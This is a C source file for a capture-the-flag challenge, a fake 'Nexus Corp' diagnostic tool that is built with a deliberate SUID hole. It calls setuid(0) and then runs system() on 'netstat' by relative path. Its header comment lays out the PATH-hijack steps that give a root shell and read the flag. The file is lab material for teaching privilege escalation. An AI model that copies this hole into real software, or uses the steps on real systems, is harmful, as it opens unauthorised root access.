/*
 * Nexus Corp System Diagnostic Tool — system-check.c
 * =====================================================
 * CTF Challenge: Stage 05 | Linux System Security
 * Vulnerability: SUID binary using relative path in system() call
 *
 * VULNERABILITY:
 *   system("netstat -tulnp") uses a relative path for 'netstat'.
 *   When run as SUID root, the effective UID = 0.
 *   An attacker can create a malicious 'netstat' in /tmp and prepend
 *   /tmp to their PATH — the OS will execute the fake netstat as root.
 *
 * EXPLOIT STEPS:
 *   1. cd /tmp
 *   2. echo '/bin/bash -p' > netstat
 *   3. chmod +x netstat
 *   4. export PATH=/tmp:$PATH
 *   5. /usr/local/bin/system-check
 *      → shell spawns with effective UID 0 (root)
 *   6. cat /root/root_flag.txt
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(void)
{
    printf("===========================================\n");
    printf("  Nexus Corp System Diagnostic Tool v1.2  \n");
    printf("===========================================\n");
    printf("[*] Operator UID : %d\n", getuid());
    printf("[*] Effective UID: %d\n", geteuid());
    printf("[*] Running network connectivity diagnostics...\n\n");

    /*
     * VULNERABILITY:
     * Uses relative path "netstat" instead of absolute "/usr/sbin/netstat".
     * The OS resolves 'netstat' by searching directories in $PATH left-to-right.
     * If an attacker controls $PATH, they control which binary runs — AS ROOT.
     */
    setuid(0);
    setgid(0);
    int ret = system("netstat -tulnp");

    if (ret == 0) {
        printf("\n[+] Diagnostic complete. All systems nominal.\n");
    } else {
        printf("\n[-] Diagnostic error (exit code: %d)\n", ret);
    }

    return 0;
}
